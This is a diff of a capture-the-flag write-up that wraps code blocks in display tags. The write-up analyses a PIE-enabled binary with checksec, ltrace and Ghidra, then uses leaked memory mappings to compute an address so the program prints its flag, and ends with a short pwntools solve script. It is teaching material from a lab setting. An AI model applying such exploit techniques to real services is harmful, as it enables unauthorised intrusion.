@@ -32,22 +32,27 @@ layout:
 
 First use `pwninit` to patch the binary with local libc (the supplied `libc.so.6` wasn't enough, I had to copy `ld-linux-x86-64.so.2` from a local backup of `GLIBC_2.34`, which is pretty standard for CTFs these days).
 
+{% code overflow="wrap" %}
 ```bash
 ldd chal
 	linux-vdso.so.1 (0x00007fff98fb4000)
 	libc.so.6 => ./libc.so.6 (0x00007f1de5200000)
 	/lib64/ld-linux-x86-64.so.2 (0x00007f1de557b000)
 ```
+{% endcode %}
 
 `file` shows the binary isn't stripped, which will make [[#Static Analysis]] easier.
 
+{% code overflow="wrap" %}
 ```bash
 file chal
 chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325b22ba12d76ae327d8eb123e929cece1743e1e, not stripped
 ```
+{% endcode %}
 
 Check binary protections with `checksec`.
 
+{% code overflow="wrap" %}
 ```bash
 checksec --file chal
 [*] '/home/crystal/Desktop/chall/chal'
@@ -58,6 +63,7 @@ checksec --file chal
     PIE:      PIE enabled
     RUNPATH:  b'.'
 ```
+{% endcode %}
 
 So, we don't need to worry about canaries, but we can't execute shellcode on the stack. Furthermore, PIE is enabled, so addresses won't be fixed.
 
@@ -67,6 +73,7 @@ After creating flag.txt, the binary exits immediately, with no output.
 
 We could use `ltrace` to get a better understanding of what's happening.
 
+{% code overflow="wrap" %}
 ```bash
 ltrace /home/crystal/Desktop/chall/chal
 open("/proc/self/maps", 0, 02371265710)                                 = 3
@@ -92,6 +99,7 @@ __isoc99_sscanf(0x7ffc13e56a30, 0x560bf9f7c297, 0x7ffc13e56a80, 0x7ffc13e56a7c) 
 exit(0 <no return ...>
 +++ exited (status 0) +++
 ```
+{% endcode %}
 
 OK, so the program..
 
@@ -112,6 +120,7 @@ I guess it's time to take a look at the code! Let's open it in `ghidra` 🐉
 
 I pasted the `main()` function into chatGPT and asked it to rename variables and make it more readable, here's what it gave me.
 
+{% code overflow="wrap" %}
 ```c
 int main(void)
 {
@@ -201,6 +210,7 @@ int main(void)
     return 1;
 }
 ```
+{% endcode %}
 
 We quickly realise the program _should_ print some output. When connecting to the remote server, it does so as intended. A teammate later informed me of a fix for this `ulimit -n 1338` will increase the maximum number of open file descriptors for the current shell session to 1338 (remember, the program sets the output to `fd` 1337).
 
@@ -208,6 +218,7 @@ Anyway, the while loop at the bottom is interesting. It takes a user-supplied `a
 
 What address might we choose to write the flag to? How about the string that is printed at the beginning of each loop?
 
+{% code overflow="wrap" %}
 ```c
                 s_Give_me_an_address_and_a_lengt  XREF[2]: main:00101357(*),
                                                            main:0010135e(*)
@@ -215,6 +226,7 @@ What address might we choose to write the flag to? How about the string that is 
         76 65
         20 6d
 ```
+{% endcode %}
 
 It's in the `.data` section of the binary, at an offset of `0x21e0`.
 
@@ -222,6 +234,7 @@ The program has PIE enabled, so each time it's run, the binary will have a new b
 
 We need to find the base, then add the offset. Luckily, running the program against the remote server will print out the memory mappings, e.g.
 
+{% code overflow="wrap" %}
 ```bash
 I'll give you my mappings so that you'll have a shot.
 55bae719b000-55bae719c000 r--p 00000000 00:11e 810424                    /home/user/chal
@@ -248,11 +261,13 @@ I'll give you my mappings so that you'll have a shot.
 7ffd5fbe9000-7ffd5fbeb000 r-xp 00000000 00:00 0                          [vdso]
 ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
 ```
+{% endcode %}
 
 Therefore, we'll write a script to parse this response and calculate the correct address. We'll send that address when requested and the next time the loop executes, it will print the newly written data (🚩).
 
 ## Solve Script
 
+{% code overflow="wrap" %}
 ```python
 from pwn import *
 
@@ -279,6 +294,7 @@ io.sendline(hex(piebase + data_string_offset).encode() + b' 127')
 # Flag plz
 warning(io.recv().decode())
 ```
+{% endcode %}
 
 We run the script and get the flag.
 
